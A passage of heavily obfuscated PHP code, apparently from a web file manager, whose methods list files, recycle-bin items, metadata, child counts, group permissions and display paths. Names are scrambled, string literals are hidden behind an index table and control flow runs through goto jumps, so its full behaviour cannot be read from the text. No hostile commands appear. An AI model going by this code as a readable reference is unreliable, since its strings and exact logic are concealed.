$Dí™¼¿ñ± => $Aòà‘¢ëñ) { $DÒ©å¿Õ»§ = !0; if (!$E°ÒÚ‚‡‰) { $c‰˜³¡¼°[] = $Dí™¼¿ñ±; continue; } foreach ($E°ÒÚ‚‡‰ as $d¢ËâÅ°é‰) { if (!in_array($d¢ËâÅ°é‰, $Aòà‘¢ëñ)) { $DÒ©å¿Õ»§ = !1; break; } } if ($DÒ©å¿Õ»§) { $c‰˜³¡¼°[] = $Dí™¼¿ñ±; } } if (!$c‰˜³¡¼°) { return array(); } $a…­ˆ³¸¬ = $this->listSource(array($e‘µ’¤™Ó [410] => array($e‘µ’¤™Ó [411], $c‰˜³¡¼°))); goto FˆÛÙ©½ôº; B§ãĞ³ò¾ù: } public function listUserRecycle() { $b‹óÓ‘‡Ê =& $_SERVER[œº]; $Dº®Ñ°Ù‘‡ = Model($b‹óÓ‘‡Ê[421])->listData(); if (!$Dº®Ñ°Ù‘‡) { return array(); } $BÁ»ö‘±¦Ì = array($b‹óÓ‘‡Ê[410] => array($b‹óÓ‘‡Ê[411], $Dº®Ñ°Ù‘‡), $b‹óÓ‘‡Ê[422] => 1); return $this->listSource($BÁ»ö‘±¦Ì); } public function listSource($d—š­¯´éô, $Câµôİ½ã = 3000) { goto Dö’²éˆÁ; Aö«ˆ‡Æ‚: $Aƒ’‚å½Ÿ = $this->field($dÍ”‚²°ò)->_makeOrder()->where($d—š­¯´éô)->selectPage($Câµôİ½ã); $this->_listDataApply($Aƒ’‚å½Ÿ[$C˜‹”ÜàÄ[367]]); $this->_listMake($Aƒ’‚å½Ÿ); goto D±ÔÔ†ˆÕ; D±ÔÔ†ˆÕ: return $Aƒ’‚å½Ÿ; goto DˆÉ½Š¹›Œ; Dö’²éˆÁ: $C˜‹”ÜàÄ =& $_SERVER[œº]; if (!isset($d—š­¯´éô[$C˜‹”ÜàÄ[423]])) { $d—š­¯´éô[$C˜‹”ÜàÄ[423]] = 0; } $dÍ”‚²°ò = $C˜‹”ÜàÄ[424]; goto Aö«ˆ‡Æ‚; DˆÉ½Š¹›Œ: } protected function _makeOrder() { goto FÑä†îäÄ; cŞºèµ: if ($aƒË¿µÆæ´ == $eÓ‹»©’Š[28]) { } $bÛíĞÀ¨æ = $eÓ‹»©’Š[437] . $FÀ²ŞÏùô™[$aƒË¿µÆæ´] . $eÓ‹»©’Š[50] . $B‹†‰Íó¾ê[$d’ªííŒæ]; return $this->order(rtrim(trim($bÛíĞÀ¨æ), $eÓ‹»©’Š[47])); goto B×İÕ–ğÌ; d¢¬ª¤Ø¯°: $B‹†‰Íó¾ê = array($eÓ‹»©’Š[428] => $eÓ‹»©’Š[429], $eÓ‹»©’Š[430] => $eÓ‹»©’Š[431]); $FÀ²ŞÏùô™ = array($eÓ‹»©’Š[28] => $eÓ‹»©’Š[28], $eÓ‹»©’Š[78] => $eÓ‹»©’Š[78], $eÓ‹»©’Š[168] => $eÓ‹»©’Š[405], $eÓ‹»©’Š[432] => $eÓ‹»©’Š[432], $eÓ‹»©’Š[433] => $eÓ‹»©’Š[434], $eÓ‹»©’Š[194] => $eÓ‹»©’Š[194], $eÓ‹»©’Š[84] => $eÓ‹»©’Š[84]); $aƒË¿µÆæ´ = Input::get($eÓ‹»©’Š[435], $eÓ‹»©’Š[7], $dù¯©«Ôˆğ, array_keys($FÀ²ŞÏùô™)); goto FÁ±¡¬‘í¬; FÁ±¡¬‘í¬: $d’ªííŒæ = Input::get($eÓ‹»©’Š[436], $eÓ‹»©’Š[7], $bÛİğ‡Ğ‘, array_keys($B‹†‰Íó¾ê)); if (!in_array($aƒË¿µÆæ´, array_keys($FÀ²ŞÏùô™))) { $aƒË¿µÆæ´ = $eÓ‹»©’Š[28]; } if (!in_array($d’ªííŒæ, array_keys($B‹†‰Íó¾ê))) { $aƒË¿µÆæ´ = $eÓ‹»©’Š[428]; } goto cŞºèµ; FÑä†îäÄ: $eÓ‹»©’Š =& $_SERVER[œº]; $dù¯©«Ôˆğ = Model($eÓ‹»©’Š[425])->get($eÓ‹»©’Š[426]); $bÛİğ‡Ğ‘ = Model($eÓ‹»©’Š[425])->get($eÓ‹»©’Š[427]); goto d¢¬ª¤Ø¯°; B×İÕ–ğÌ: } protected function _listDataApplyItem($CàÉ…¤¤¸¦, $a…²ìõ¢ƒô = false) { $FØÃÛ‡à¨• = array($CàÉ…¤¤¸¦); $this->_listDataApply($FØÃÛ‡à¨•, $a…²ìõ¢ƒô); return $FØÃÛ‡à¨•[0]; } protected function _listDataApply(&$e®°”…Å½â, $C§‹ÜêØÃ± = false) { goto f›Ê¬›³ƒ; BÓ÷ë¾›’œ: $this->_listAppendUser($e®°”…Å½â); $this->_listFilterInfo($e®°”…Å½â, $C§‹ÜêØÃ±); goto b‚²œªÓ¿; cáªƒùÅ¶£: $this->_listAppendPath($e®°”…Å½â); $this->_listAppendAuth($e®°”…Å½â); $this->_listAppendSourceInfo($e®°”…Å½â, $cˆÄ×»Ø‰); goto BÓ÷ë¾›’œ; f›Ê¬›³ƒ: $CÄŠÇ—°Œ =& $_SERVER[œº]; if (!$e®°”…Å½â) { $e®°”…Å½â = array(); return; } $cˆÄ×»Ø‰ = array_to_keyvalue($e®°”…Å½â, $CÄŠÇ—°Œ[33], $CÄŠÇ—°Œ[395]); goto dÛ¡µ“Åö; dÛ¡µ“Åö: $cˆÄ×»Ø‰ = array_unique($cˆÄ×»Ø‰); $this->_listSourceCache($e®°”…Å½â); if (!$C§‹ÜêØÃ±) { $this->_listAppendMeta($e®°”…Å½â, $cˆÄ×»Ø‰); $this->_listAppendFileMeta($e®°”…Å½â, $cˆÄ×»Ø‰); $this->_listAppendChildren($e®°”…Å½â, $cˆÄ×»Ø‰); } goto cáªƒùÅ¶£; b‚²œªÓ¿: } protected function _listSourceCache($CïÏšøëğî) { $a†ìÌ‡ô» =& $_SERVER[œº]; foreach ($CïÏšøëğî as $cÎåç¯«ƒØ) { self::$cacheSourceInfo[$a†ìÌ‡ô»[438] . $cÎåç¯«ƒØ[$a†ìÌ‡ô»[395]]] = $cÎåç¯«ƒØ; } } protected function _listFilterInfo(&$EÍÚ°Œ…î…, $EñË¡Û–­ = false) { $eŒ‰‹±Ò =& $_SERVER[œº]; foreach ($EÍÚ°Œ…î… as &$E¸¼¥ª˜…²) { $E¸¼¥ª˜…² = $this->pathInfoFilter($E¸¼¥ª˜…²); self::$cachePathInfo[$eŒ‰‹±Ò[439] . intval($EñË¡Û–­) . $eŒ‰‹±Ò[440] . $E¸¼¥ª˜…²[$eŒ‰‹±Ò[395]]] = $E¸¼¥ª˜…²; } unset($E¸¼¥ª˜…²); } protected function _listMake(&$cáˆâò¶‘) { $B·†ìÁ×¸¢ =& $_SERVER[œº]; $cáˆâò¶‘[$B·†ìÁ×¸¢[75]] = array(); $cáˆâò¶‘[$B·†ìÁ×¸¢[74]] = array(); foreach ($cáˆâò¶‘[$B·†ìÁ×¸¢[367]] as $D“ğ‹—ñÈ) { $B‰¶ìÍÛÌÊ = $D“ğ‹—ñÈ[$B·†ìÁ×¸¢[403]] == 1 ? $B·†ìÁ×¸¢[75] : $B·†ìÁ×¸¢[74]; $cáˆâò¶‘[$B‰¶ìÍÛÌÊ][] = $D“ğ‹—ñÈ; } unset($cáˆâò¶‘[$B·†ìÁ×¸¢[367]]); } protected function _listAppendMeta(&$fºİÂ–†öà, $C¬ˆ¦³¹Êƒ) { goto Dí–‘¥ÀŸ«; AŒÔ°ÚĞùâ: foreach ($bÒÎ™Ì”Â« as $B™å„èÆ) { if (!isset($E âåëÕ–[$B™å„èÆ[$E¢æÌöôÊ°[395]]])) { $E âåëÕ–[$B™å„èÆ[$E¢æÌöôÊ°[395]]] = array(); } if (in_array($B™å„èÆ[$E¢æÌöôÊ°[93]], $aå“¦ÓˆğØ)) { continue; } $E âåëÕ–[$B™å„èÆ[$E¢æÌöôÊ°[395]]][$B™å„èÆ[$E¢æÌöôÊ°[93]]] = $B™å„èÆ[$E¢æÌöôÊ°[372]]; } foreach ($fºİÂ–†öà as &$DÄ˜³’ÆÉ) { $DÄ˜³’ÆÉ[$E¢æÌöôÊ°[445]] = !1; if (isset($E âåëÕ–[$DÄ˜³’ÆÉ[$E¢æÌöôÊ°[395]]])) { $DÄ˜³’ÆÉ[$E¢æÌöôÊ°[445]] = $E âåëÕ–[$DÄ˜³’ÆÉ[$E¢æÌöôÊ°[395]]]; } if ($this->fileIsLock($DÄ˜³’ÆÉ) && $DÄ˜³’ÆÉ[$E¢æÌöôÊ°[406]]) { $A„¬°±®¤Ô = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $DÄ˜³’ÆÉ[$E¢æÌöôÊ°[406]][$E¢æÌöôÊ°[407]] = AuthModel::authDisable($DÄ˜³’ÆÉ[$E¢æÌöôÊ°[406]][$E¢æÌöôÊ°[407]], $A„¬°±®¤Ô); $DÄ˜³’ÆÉ[$E¢æÌöôÊ°[406]][$E¢æÌöôÊ°[446]][$E¢æÌöôÊ°[406]] = $DÄ˜³’ÆÉ[$E¢æÌöôÊ°[406]][$E¢æÌöôÊ°[407]]; } } unset($DÄ˜³’ÆÉ); goto D¹Á¿‘á; FŠÌÕš½Õ§: if (!$bÒÎ™Ì”Â«) { return; } $aå“¦ÓˆğØ = array($E¢æÌöôÊ°[443], $E¢æÌöôÊ°[444]); $E âåëÕ– = array(); goto AŒÔ°ÚĞùâ; Dí–‘¥ÀŸ«: $E¢æÌöôÊ° =& $_SERVER[œº]; $fÊà•­ñ™ = array($E¢æÌöôÊ°[410] => array($E¢æÌöôÊ°[411], $C¬ˆ¦³¹Êƒ)); $bÒÎ™Ì”Â« = Model($E¢æÌöôÊ°[441])->field($E¢æÌöôÊ°[442])->where($fÊà•­ñ™)->select(); goto FŠÌÕš½Õ§; D¹Á¿‘á: } protected function _listAppendFileMeta(&$CÕñ·ÚØ­¾, $c”¾Èğìçë) { goto C˜×Ä·Æ‡; eÆßŒ»½§Õ: foreach ($CÕñ·ÚØ­¾ as &$DŞ°–±³) { goto dòÔ±ãĞáÈ; F¢ø“¸á‘Û: $C÷Ãœ‘Ì³[$Eê÷¾ğÆö[78]] = $DŞ°–±³[$Eê÷¾ğÆö[78]]; $C÷Ãœ‘Ì³[$Eê÷¾ğÆö[28]] = $DŞ°–±³[$Eê÷¾ğÆö[28]]; if (!isset(self::$cacheFileInfo[$Eê÷¾ğÆö[453] . $A¥ĞñŒÇ’ ])) { self::$cacheFileInfo[$Eê÷¾ğÆö[453] . $A¥ĞñŒÇ’ ] = array_merge(array(), $C÷Ãœ‘Ì³); } goto b³Å¯ÉÑÀñ; b³Å¯ÉÑÀñ: unset($cŸ˜¥á–»´[$A¥ĞñŒÇ’ ][$Eê÷¾ğÆö[76]]); $b†Ğšñ›äƒ = is_array($f²‘„Ù‰í–[$A¥ĞñŒÇ’ ]) ? $f²‘„Ù‰í–[$A¥ĞñŒÇ’ ] : array(); $DŞ°–±³[$Eê÷¾ğÆö[164]] = array_merge($b†Ğšñ›äƒ, $cŸ˜¥á–»´[$A¥ĞñŒÇ’ ]); goto Dê¨öÅ´ª; dòÔ±ãĞáÈ: $A¥ĞñŒÇ’  = $DŞ°–±³[$Eê÷¾ğÆö[447]]; if (!$A¥ĞñŒÇ’  || !is_array($cŸ˜¥á–»´[$A¥ĞñŒÇ’ ])) { continue; } $C÷Ãœ‘Ì³ = $cŸ˜¥á–»´[$A¥ĞñŒÇ’ ]; goto F¢ø“¸á‘Û; Dê¨öÅ´ª: if (isset($DŞ°–±³[$Eê÷¾ğÆö[164]][$Eê÷¾ğÆö[163]])) { $DŞ°–±³[$Eê÷¾ğÆö[163]] = json_decode($DŞ°–±³[$Eê÷¾ğÆö[164]][$Eê÷¾ğÆö[163]], !0); unset($DŞ°–±³[$Eê÷¾ğÆö[164]][$Eê÷¾ğÆö[163]]); } goto fø™Ø…áÍÑ; fø™Ø…áÍÑ: } unset($DŞ°–±³); goto cæ‹‰„øá¡; AÚÑÊŞ›ë: if (!$ağÆŞ¡ãØ) { return; } $eáø‹×õÙ¥ = array($Eê÷¾ğÆö[448] => array($Eê÷¾ğÆö[411], $ağÆŞ¡ãØ)); $bÖ…á…Í…× = $Eê÷¾ğÆö[449]; goto D±Ûß§áê; c•ä‹Ï­ò¦: $FÍ¨îø£Œ¾ = $FÍ¨îø£Œ¾ ? $FÍ¨îø£Œ¾ : array(); $f²‘„Ù‰í– = array(); foreach ($FÍ¨îø£Œ¾ as $dˆÆİòàó©) { if (!isset($f²‘„Ù‰í–[$dˆÆİòàó©[$Eê÷¾ğÆö[447]]])) { $f²‘„Ù‰í–[$dˆÆİòàó©[$Eê÷¾ğÆö[447]]] = array(); } $f²‘„Ù‰í–[$dˆÆİòàó©[$Eê÷¾ğÆö[447]]][$dˆÆİòàó©[$Eê÷¾ğÆö[93]]] = $dˆÆİòàó©[$Eê÷¾ğÆö[372]]; } goto eÆßŒ»½§Õ; D±Ûß§áê: $cŸ˜¥á–»´ = Model($Eê÷¾ğÆö[450])->field($bÖ…á…Í…×)->where($eáø‹×õÙ¥)->select(); $cŸ˜¥á–»´ = array_to_keyvalue($cŸ˜¥á–»´, $Eê÷¾ğÆö[447]); $FÍ¨îø£Œ¾ = Model($Eê÷¾ğÆö[451])->field($Eê÷¾ğÆö[452])->where($eáø‹×õÙ¥)->select(); goto c•ä‹Ï­ò¦; C˜×Ä·Æ‡: $Eê÷¾ğÆö =& $_SERVER[œº]; $ağÆŞ¡ãØ = array_to_keyvalue($CÕñ·ÚØ­¾, $Eê÷¾ğÆö[33], $Eê÷¾ğÆö[447]); $ağÆŞ¡ãØ = array_filter(array_unique($ağÆŞ¡ãØ)); goto AÚÑÊŞ›ë; cæ‹‰„øá¡: } protected function _listAppendSourceInfo(&$dŠ¯—–œÔ, $FÛ»‚ù¦ÉÛ) { goto eÇ¾…Ğ¥£; eÂÙÎ‹Óªà: return $dŠ¯—–œÔ; goto BÓ‹ÁÕï°£; Dè“Õ‚ïÅß: $D¥éˆ¥„Ó¥ = Model($BÍÓå¯ÕÏ[418])->listData(); $e±÷÷ø‘º¥ = Model($BÍÓå¯ÕÏ[408])->listData(); $cò¸ÓÊ‡ó± = Model($BÍÓå¯ÕÏ[456])->listSimple(); goto dŞ»Í•Ëó©; eÇ¾…Ğ¥£: $BÍÓå¯ÕÏ =& $_SERVER[œº]; if (!defined($BÍÓå¯ÕÏ[454])) { return; } $DóŸ™±î÷ = Model($BÍÓå¯ÕÏ[455])->listData(); goto Dè“Õ‚ïÅß; dŞ»Í•Ëó©: $D¯½ø‡‰ºË = array_to_keyvalue($DóŸ™±î÷, $BÍÓå¯ÕÏ[393]); $EêãŒ¯Î™ = array_to_keyvalue_group($D¥éˆ¥„Ó¥, $BÍÓå¯ÕÏ[76], $BÍÓå¯ÕÏ[419]); $aéï…Â–Ò¿ = array_to_keyvalue($e±÷÷ø‘º¥, $BÍÓå¯ÕÏ[76]); goto B‘éò“Ïß; B‘éò“Ïß: $bÄî±‚×ÏÔ = array_to_keyvalue_group($cò¸ÓÊ‡ó±, $BÍÓå¯ÕÏ[395]); foreach ($dŠ¯—–œÔ as &$FÇ²¼ÛÌöæ) { $FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[85]] = array($BÍÓå¯ÕÏ[457] => 0, $BÍÓå¯ÕÏ[458] => 0, $BÍÓå¯ÕÏ[459] => 0); if (isset($aéï…Â–Ò¿[$FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[395]]])) { $FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[85]][$BÍÓå¯ÕÏ[460]] = 1; $FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[85]][$BÍÓå¯ÕÏ[461]] = $aéï…Â–Ò¿[$FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[395]]][$BÍÓå¯ÕÏ[28]]; } if (isset($EêãŒ¯Î™[$FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[395]]])) { $FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[85]][$BÍÓå¯ÕÏ[462]] = array(); foreach ($EêãŒ¯Î™[$FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[395]]] as $eåÁœê‡“‚) { $Dó °ËËäß = $D¯½ø‡‰ºË[$eåÁœê‡“‚]; $FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[85]][$BÍÓå¯ÕÏ[462]][] = array($BÍÓå¯ÕÏ[463] => $Dó °ËËäß[$BÍÓå¯ÕÏ[393]], $BÍÓå¯ÕÏ[413] => $Dó °ËËäß[$BÍÓå¯ÕÏ[28]], $BÍÓå¯ÕÏ[464] => $Dó °ËËäß[$BÍÓå¯ÕÏ[465]]); } } if (isset($bÄî±‚×ÏÔ[$FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[395]]])) { $FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[85]][$BÍÓå¯ÕÏ[466]] = array(); foreach ($bÄî±‚×ÏÔ[$FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[395]]] as $aè’„ĞÒ¼‹) { $FÇ²¼ÛÌöæ[$BÍÓå¯ÕÏ[85]][$BÍÓå¯ÕÏ[466]] = array($BÍÓå¯ÕÏ[467] => $aè’„ĞÒ¼‹[$BÍÓå¯ÕÏ[468]], $BÍÓå¯ÕÏ[469] => $aè’„ĞÒ¼‹[$BÍÓå¯ÕÏ[470]], $BÍÓå¯ÕÏ[471] => $aè’„ĞÒ¼‹[$BÍÓå¯ÕÏ[395]], $BÍÓå¯ÕÏ[472] => $aè’„ĞÒ¼‹[$BÍÓå¯ÕÏ[473]], $BÍÓå¯ÕÏ[474] => $aè’„ĞÒ¼‹[$BÍÓå¯ÕÏ[475]], $BÍÓå¯ÕÏ[476] => $aè’„ĞÒ¼‹[$BÍÓå¯ÕÏ[476]], $BÍÓå¯ÕÏ[477] => $aè’„ĞÒ¼‹[$BÍÓå¯ÕÏ[477]]); } } } unset($FÇ²¼ÛÌöæ); goto eÂÙÎ‹Óªà; BÓ‹ÁÕï°£: } protected function _listAppendChildren(&$EãÜìˆ®ß, $D™Ûš‡¡÷ˆ) { goto EµÉ»èö­‘; AÕ»µáš¶¯: $bÛ‘Á‚‘­Æ = array($fôİÅù¡[478] => array($fôİÅù¡[7], $a¯¹ïÜ‚ï)); $Cì¦¡ñâÜ = array($fôİÅù¡[478], $fôİÅù¡[403], $fôİÅù¡[479] => $fôİÅù¡[480]); $D‚àÌæÚÍ = $this->field($Cì¦¡ñâÜ)->where($bÛ‘Á‚‘­Æ)->group($fôİÅù¡[481])->select(); goto fÚˆÍù‘; DÚÉÑ…ªÅô: foreach ($EãÜìˆ®ß as &$cƒ‘ÄŒ¡“) { if (!$cƒ‘ÄŒ¡“[$fôİÅù¡[403]]) { continue; } $a¯¹ïÜ‚ï[] = $cƒ‘ÄŒ¡“[$fôİÅù¡[395]]; } unset($cƒ‘ÄŒ¡“); if (!$a¯¹ïÜ‚ï) { return; } goto AÕ»µáš¶¯; fÚˆÍù‘: $FñŒíÖøñî = array(); foreach ($D‚àÌæÚÍ as $CóÔ„§Óß£) { $c…›õ±‡ç = $CóÔ„§Óß£[$fôİÅù¡[478]]; $Dš¶ÏÚÍÎ = $CóÔ„§Óß£[$fôİÅù¡[403]] == $fôİÅù¡[87] ? $fôİÅù¡[204] : $fôİÅù¡[203]; if (!isset($FñŒíÖøñî[$c…›õ±‡ç])) { $FñŒíÖøñî[$c…›õ±‡ç] = array($fôİÅù¡[203] => 0, $fôİÅù¡[204] => 0); } $FñŒíÖøñî[$c…›õ±‡ç][$Dš¶ÏÚÍÎ] += $CóÔ„§Óß£[$fôİÅù¡[480]]; } foreach ($EãÜìˆ®ß as &$cƒ‘ÄŒ¡“) { if (!$cƒ‘ÄŒ¡“[$fôİÅù¡[403]]) { continue; } $b±ÚŒ§Ü†º = is_array($FñŒíÖøñî[$cƒ‘ÄŒ¡“[$fôİÅù¡[395]]]) ? $FñŒíÖøñî[$cƒ‘ÄŒ¡“[$fôİÅù¡[395]]] : $bÔº¸¿âÀ¼; $cƒ‘ÄŒ¡“[$fôİÅù¡[204]] = $b±ÚŒ§Ü†º[$fôİÅù¡[204]]; $cƒ‘ÄŒ¡“[$fôİÅù¡[203]] = $b±ÚŒ§Ü†º[$fôİÅù¡[203]]; unset($cƒ‘ÄŒ¡“[$fôİÅù¡[405]]); } goto Aá…àš×ƒÉ; Aá…àš×ƒÉ: unset($cƒ‘ÄŒ¡“); goto B¬ÑÖùÕ·; EµÉ»èö­‘: $fôİÅù¡ =& $_SERVER[œº]; $a¯¹ïÜ‚ï = array(); $bÔº¸¿âÀ¼ = array($fôİÅù¡[203] => 0, $fôİÅù¡[204] => 0); goto DÚÉÑ…ªÅô; B¬ÑÖùÕ·: } protected function _listAppendAuth(&$d¦«é¨Ğ½÷) { goto aŒ¤Á•ÊÎœ; b“ƒÁ‚§­è: foreach ($d¦«é¨Ğ½÷ as $eŞì¤ß©éÕ) { if ($eŞì¤ß©éÕ[$fœó ôêİğ[404]] == self::TYPE_GROUP) { $a°ŞïµĞ¬š[] = $eŞì¤ß©éÕ[$fœó ôêİğ[395]]; } } if (!$a°ŞïµĞ¬š) { return; } $B“ƒÂ½Å°ø = array_to_keyvalue($d¦«é¨Ğ½÷, $fœó ôêİğ[395]); goto fø…ƒ‚²; fø…ƒ‚²: $D“š¾»áˆ = Model($fœó ôêİğ[482])->getSourceList($a°ŞïµĞ¬š, $B“ƒÂ½Å°ø); foreach ($d¦«é¨Ğ½÷ as $böŸ‰ƒŞº´ => &$eŞì¤ß©éÕ) { $eŞì¤ß©éÕ[$fœó ôêİğ[406]] = $D“š¾»áˆ[$eŞì¤ß©éÕ[$fœó ôêİğ[395]]]; if (!$eŞì¤ß©éÕ[$fœó ôêİğ[406]] && $eŞì¤ß©éÕ[$fœó ôêİğ[404]] == self::TYPE_GROUP) { $eŞì¤ß©éÕ[$fœó ôêİğ[406]] = Action($fœó ôêİğ[483])->pathGroupAuthMake($eŞì¤ß©éÕ[$fœó ôêİğ[484]]); if (!$eŞì¤ß©éÕ[$fœó ôêİğ[406]] && !_get($GLOBALS, $fœó ôêİğ[485])) { $eŞì¤ß©éÕ[$fœó ôêİğ[196]] = !1; $eŞì¤ß©éÕ[$fœó ôêİğ[195]] = !1; } } if ($eŞì¤ß©éÕ[$fœó ôêİğ[406]]) { $eŞì¤ß©éÕ[$fœó ôêİğ[196]] = AuthModel::authCheckEdit($eŞì¤ß©éÕ[$fœó ôêİğ[406]][$fœó ôêİğ[407]]); $eŞì¤ß©éÕ[$fœó ôêİğ[195]] = AuthModel::authCheckView($eŞì¤ß©éÕ[$fœó ôêİğ[406]][$fœó ôêİğ[407]]); } $this->groupPathDisplay($eŞì¤ß©éÕ); } unset($eŞì¤ß©éÕ); goto FˆÚµ¹Ğ‡ò; aŒ¤Á•ÊÎœ: $fœó ôêİğ =& $_SERVER[œº]; if (!defined($fœó ôêİğ[454])) { return; } $a°ŞïµĞ¬š = array(); goto b“ƒÁ‚§­è; FˆÚµ¹Ğ‡ò: } public function groupPathDisplay(&$bÏâˆŠ«İá) { goto Dœº›ÆÍí«; Dœº›ÆÍí«: $dÏÙ«×¬‘ğ =& $_SERVER[œº]; if ($bÏâˆŠ«İá[$dÏÙ«×¬‘ğ[404]] != self::TYPE_GROUP) { return; } $DèÙéğ´¸ = Model($dÏÙ«×¬‘ğ[486])->getInfo($bÏâˆŠ«İá[$dÏÙ«×¬‘ğ[484]]); goto D’»ø‡ÄêÅ; AóÎàô“Äƒ: $bÏâˆŠ«İá[$dÏÙ«×¬‘ğ[488]] = $DèÙéğ´¸[$dÏÙ«×¬‘ğ[478]]; $bÏâˆŠ«İá[$dÏÙ«×¬‘ğ[489]] = $DèÙéğ´¸[$dÏÙ«×¬‘ğ[487]]; $bÏâˆŠ«İá[$dÏÙ«×¬‘ğ[490]] = $DèÙéğ´¸[$dÏÙ«×¬‘ğ[491]]; goto B¢ä”È–î×; B¢ä”È–î×: $bÏâˆŠ«İá[$dÏÙ«×¬‘ğ[492]] = $Fù°·ÍšÉ˜ . $DèÙéğ´¸[$dÏÙ«×¬‘ğ[85]][$dÏÙ«×¬‘ğ[395]]; goto aù‹ ¦Æµ÷; D’»ø‡ÄêÅ: $Fìöƒ¶ÒŒŞ = $this->parentLevelArray($DèÙéğ´¸[$dÏÙ«×¬‘ğ[487]]); $Fù°·ÍšÉ˜ = $dÏÙ«×¬‘ğ[33]; foreach ($Fìöƒ¶ÒŒŞ as $EœÀ¶à¹–) { $a®Œ¤«ˆĞ = Model($dÏÙ«×¬‘ğ[486])->getInfo($EœÀ¶à¹–); $Fù°·ÍšÉ˜ .= $a®Œ¤«ˆĞ[$dÏÙ«×¬‘ğ[85]][$dÏÙ«×¬‘ğ[395]] . $dÏÙ«×¬‘ğ[47]; } goto AóÎàô“Äƒ; aù‹ ¦Æµ÷: } protected function _listAppendPath(&$b’ò¾Œ¥ùÚ) { goto eºÚ¶”í­; Bô´´é‹›Õ: unset($CÙóÊ¸™Ÿ©); return $b’ò¾Œ¥ùÚ; goto DçÆ™–ŸõÁ; c¸±È£”: $b‘Áƒº×æÄ = array_unique($b‘Áƒº×æÄ); if (count($b‘Áƒº×æÄ) > 0) { $A¬µ¨©½Õ˜ = array($CòäÎÛ÷¥[410] => array($CòäÎÛ÷¥[411], $b‘Áƒº×æÄ)); if (count($b‘Áƒº×æÄ) == 1) { $BĞ»á´Êœ = $this->sourceInfo($b‘Áƒº×æÄ[0]); $EÄÉï† = is_array($BĞ»á´Êœ) ? array($BĞ»á´Êœ) : !1; } else { $EÄÉï† = $this->field($CòäÎÛ÷¥[493])->where($A¬µ¨©½Õ˜)->select(); } if (!$EÄÉï†) { $EÄÉï† = array(); } foreach ($EÄÉï† as $fôÁâ ƒîâ) { $FÔ»¦Ù÷¼Ô[$fôÁâ ƒîâ[$CòäÎÛ÷¥[395]]] = $fôÁâ ƒîâ[$CòäÎÛ÷¥[28]]; } } $D‡ÁÔš˜±“ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto DõâÌ¸Êß®; DõâÌ¸Êß®: $cß‰ğÚË÷§ = array(); $B ’›à ĞŠ = array(); foreach ($b’ò¾Œ¥ùÚ as &$CÙóÊ¸™Ÿ©) { goto AŠ´”¹é­¦; f§äËØ‰Óœ: if (intval($CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($CÙóÊ¸™Ÿ©, $bÇÖãÊºˆõ, $D‡ÁÔš˜±“); } goto câËŠ‹ôœñ; EÊ”§£â®Š: $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[495]] = str_replace($CòäÎÛ÷¥[496], $CòäÎÛ÷¥[8], $cáÇìÜ‚…); $eŠ–æé‘Ô¨ = trim($CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[495]], $CòäÎÛ÷¥[8]); if ($CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[478]] == $CòäÎÛ÷¥[191] && $eŠ–æé‘Ô¨) { $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[28]] = $eŠ–æé‘Ô¨; } goto f§äËØ‰Óœ; AŠ´”¹é­¦: $BˆÌÃÙ‡ÙÊ = $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[487]]; if (isset($B ’›à ĞŠ[$BˆÌÃÙ‡ÙÊ])) { $cáÇìÜ‚… = $cß‰ğÚË÷§[$BˆÌÃÙ‡ÙÊ]; } else { $bÇÖãÊºˆõ = $this->parentLevelArray($CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[487]]); $CæËÌßÙÑ¨ = $CòäÎÛ÷¥[494] . $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[404]] . $CòäÎÛ÷¥[440] . $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[484]]; if ($cß‰ğÚË÷§[$CæËÌßÙÑ¨]) { $cáÇìÜ‚… = $cß‰ğÚË÷§[$CæËÌßÙÑ¨]; } else { $cáÇìÜ‚… = $this->_listAppendPathRoot($CÙóÊ¸™Ÿ©, $bÇÖãÊºˆõ); $cß‰ğÚË÷§[$CæËÌßÙÑ¨] = $cáÇìÜ‚…; } foreach ($bÇÖãÊºˆõ as $eÀÑ‘ºå¢È => $d„Ë”á‡Ø˜) { if ($eÀÑ‘ºå¢È == 0 && $cáÇìÜ‚… && $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[404]] == self::TYPE_GROUP) { continue; } if (isset($FÔ»¦Ù÷¼Ô[$d„Ë”á‡Ø˜])) { $cáÇìÜ‚… .= $FÔ»¦Ù÷¼Ô[$d„Ë”á‡Ø˜] . $CòäÎÛ÷¥[8]; } } if ($bÇÖãÊºˆõ) { $cáÇìÜ‚… .= $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[28]]; } $cß‰ğÚË÷§[$BˆÌÃÙ‡ÙÊ] = $cáÇìÜ‚…; } if ($CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[403]]) { $cáÇìÜ‚… .= $CòäÎÛ÷¥[8]; } goto EÊ”§£â®Š; câËŠ‹ôœñ: } goto Bô´´é‹›Õ; eºÚ¶”í­: $CòäÎÛ÷¥ =& $_SERVER[œº]; static $FÔ»¦Ù÷¼Ô = array(); $b‘Áƒº×æÄ = array(); goto C¦ô¦íÁ«; C¦ô¦íÁ«: $F¥òî×´ßÒ = array(); foreach ($b’ò¾Œ¥ùÚ as &$CÙóÊ¸™Ÿ©) { $Fï‚í‰Å­â = $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[403]] == $CòäÎÛ÷¥[87]; if 